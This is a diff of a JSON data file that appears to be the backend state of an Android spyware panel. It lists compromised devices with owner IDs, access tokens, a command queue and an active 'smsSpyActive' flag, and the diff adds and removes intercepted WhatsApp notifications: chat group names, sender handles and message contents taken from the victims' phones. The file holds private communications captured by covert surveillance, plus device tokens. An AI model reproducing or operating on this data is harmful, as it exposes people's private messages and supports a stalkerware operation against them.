@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775043224503,
+    "lastSeen": 1775043227575,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15002 pesan dari 9 chat",
+        "time": "01/04 19:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043229015
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15004 pesan dari 9 chat",
+        "time": "01/04 19:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043227491
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12771 pesan): ~ Bot",
+        "content": "❌ Jawaban Salah untuk soal ini. Coba lagi!",
+        "time": "01/04 19:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043227478
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12770 pesan): ~ 🕷️",
@@ -3995,30 +4019,6 @@
         "time": "01/04 19:24",
         "pkg": "com.whatsapp",
         "receivedAt": 1775042659005
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Pegasus-X Room (4 pesan): ~ Call Me Zal7Sex",
-        "content": "🔗 TikTok · — Zal Infinity | penuhkan komen #Zal7Sex kalo mau apk ga maintenance😈\n\nlink video\nhttps://vt.tiktok.com/ZSHjYWLJT",
-        "time": "01/04 19:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042658856
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (3 pesan): ~ Call Me Zal7Sex",
-        "content": "🔗 TikTok · — Zal Infinity | penuhkan komen #Zal7Sex kalo mau apk ga maintenance😈\n\nlink video\nhttps://vt.tiktok.com/ZSHjYWLJT",
-        "time": "01/04 19:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042658730
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ISIAN ZAYN X OWN [2] (1833 pesan): ~ dikzz [own Zayn gb8 x PT bomo]",
-        "content": "22 3 nvmtps fpt n mcro mobi andro only",
-        "time": "01/04 19:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042658617
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775043226554,
+    "lastSeen": 1775043228737,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12771 pesan): ~ Bot",
+        "content": "❌ Jawaban Salah untuk soal ini. Coba lagi!",
+        "time": "01/04 19:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043227502
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -8056,14 +8064,6 @@
         "time": "01/04 19:24",
         "pkg": "com.whatsapp",
         "receivedAt": 1775042659068
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12588 pesan): ~ Dapa",
-        "content": ".brat awas aja lu",
-        "time": "01/04 19:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042658990
       }
     ],
     "galleryPhotos": [],
